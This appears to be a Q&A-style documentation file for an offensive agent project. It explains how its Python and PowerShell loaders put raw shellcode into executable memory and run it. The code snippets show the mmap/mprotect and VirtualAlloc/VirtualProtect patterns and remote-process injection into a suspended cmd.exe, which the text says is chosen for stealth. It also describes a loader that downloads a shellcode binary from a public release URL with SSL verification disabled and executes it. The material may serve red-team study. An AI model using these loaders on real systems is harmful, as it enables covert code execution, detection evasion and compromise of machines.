# 15 - Loaders (Python and PowerShell)

How shellcode gets loaded into memory and executed. The agent binary is just raw bytes — it needs something to put it in executable memory and jump to it.

---

### What is a "loader" and why is it separate from the agent?
**File:** `loaders/python/README.md` **Line(s):** (top)
**Type:** QUESTION
**Priority:** HIGH

The agent compiles to a .bin file — raw machine code, no headers, no metadata. Those bytes can't just run on their own. They need to land in executable memory and get jumped to. That's what a loader does: allocate memory with execute permission, copy the shellcode in, and jump to byte zero (which is the entry point).

The loader itself is a normal program. It doesn't need to be position-independent. Different loaders exist for different scenarios — Python for cross-platform quick testing, PowerShell for Windows enterprise environments, and in real engagements you'd write custom loaders, use process injection, whatever fits the situation.

---

### How does the Python loader work on POSIX (Linux/macOS)?
**File:** `loaders/python/loader.py` **Line(s):** (POSIX section)
**Type:** QUESTION
**Priority:** HIGH

Step by step:
```python
# 1. Allocate RW memory (mmap with PROT_READ | PROT_WRITE)
buf = mmap.mmap(-1, len(shellcode), prot=PROT_READ | PROT_WRITE)

# 2. Copy shellcode into the buffer
buf.write(shellcode)

# 3. Change permissions to RX (mprotect to PROT_READ | PROT_EXEC)
#    This is the W^X transition: writable -> executable
ctypes.CDLL(None).mprotect(buf_addr, len(shellcode), PROT_READ | PROT_EXEC)

# 4. Cast the buffer address to a function pointer and call it
func = ctypes.CFUNCTYPE(ctypes.c_int)(buf_addr)
func()
```

The key concept here is **W^X (Write XOR Execute)**. Modern OSes won't let memory be both writable and executable at the same time — if they did, any buffer overflow could inject and run code directly. So the loader allocates as writable (to copy shellcode in), then flips to executable (to run it). The memory is never both simultaneously.

---

### How does the Python loader work on Windows?
**File:** `loaders/python/loader.py` **Line(s):** (Windows section)
**Type:** QUESTION
**Priority:** MEDIUM

Windows takes a different approach — process injection:
```python
# 1. Create a suspended cmd.exe process
process = subprocess.Popen("cmd.exe", creationflags=CREATE_SUSPENDED)

# 2. Allocate memory in the remote process
remote_addr = VirtualAllocEx(process.handle, size, MEM_COMMIT, PAGE_READWRITE)

# 3. Write shellcode to remote process memory
WriteProcessMemory(process.handle, remote_addr, shellcode, size)

# 4. Change remote memory to executable
VirtualProtectEx(process.handle, remote_addr, size, PAGE_EXECUTE_READ)

# 5. Create a remote thread that starts at the shellcode
CreateRemoteThread(process.handle, remote_addr)
```
The shellcode ends up running inside cmd.exe's process space. The suspended process never actually executes cmd.exe — it's just a container for the shellcode. Running under cmd.exe's identity rather than the loader's is the whole point.

---

### How does the PowerShell loader work?
**File:** `loaders/windows/powershell/loader.ps1` **Line(s):** 44-74
**Type:** QUESTION
**Priority:** MEDIUM

PowerShell can't call Win32 APIs natively, so it uses P/Invoke through C# Add-Type:
```powershell
# 1. Define Win32 function signatures via C# Add-Type
Add-Type @"
  [DllImport("kernel32.dll")]
  public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, ...);
  [DllImport("kernel32.dll")]
  public static extern bool VirtualProtect(IntPtr addr, uint size, ...);
"@

# 2. Allocate RW memory
$addr = [Win32]::VirtualAlloc(0, $shellcode.Length, 0x3000, 0x04)
#                                                    ^MEM_COMMIT|RESERVE  ^PAGE_READWRITE

# 3. Copy shellcode
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $len)

# 4. Switch to RX
[Win32]::VirtualProtect($addr, $len, 0x20, [ref]$old)
#                                    ^PAGE_EXECUTE_READ

# 5. Cast to delegate and invoke
$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $addr, [type][PayloadEntry])
$func.Invoke()
```
Same W^X pattern as the Python loader — never writable and executable at the same time. Architecture gets auto-detected from the PROCESSOR_ARCHITECTURE environment variable.

---

### What is the difference between in-process and injected execution?
**File:** `loaders/python/README.md` **Line(s):** (POSIX vs Windows)
**Type:** QUESTION
**Priority:** MEDIUM

The two Python loader modes are fundamentally different. **In-process** (POSIX) runs the shellcode in the same process as the loader. Simpler, but if the shellcode crashes, the loader goes down with it, and the Python runtime stays in memory alongside it.

**Injected** (Windows) runs the shellcode in a separate process (cmd.exe). The shellcode is isolated — the loader can exit after injection and the shellcode keeps running independently. Better for stealth since the shellcode operates under cmd.exe's name in the process list.

---

### How does architecture auto-detection work?
**File:** `loaders/python/loader.py` **Line(s):** 92-100
**Type:** QUESTION
**Priority:** LOW

The Python loader calls `platform.machine()` to get the CPU type — "x86_64", "i386", "aarch64", etc. — and maps that to the project's architecture names. It then downloads the matching .bin from GitHub Releases at a URL like `https://github.com/nostdlib/Position-Independent-Agent/releases/latest/download/windows-x86_64.bin`. SSL verification is disabled, which makes sense given you're already trusting unsigned shellcode from a public repo.
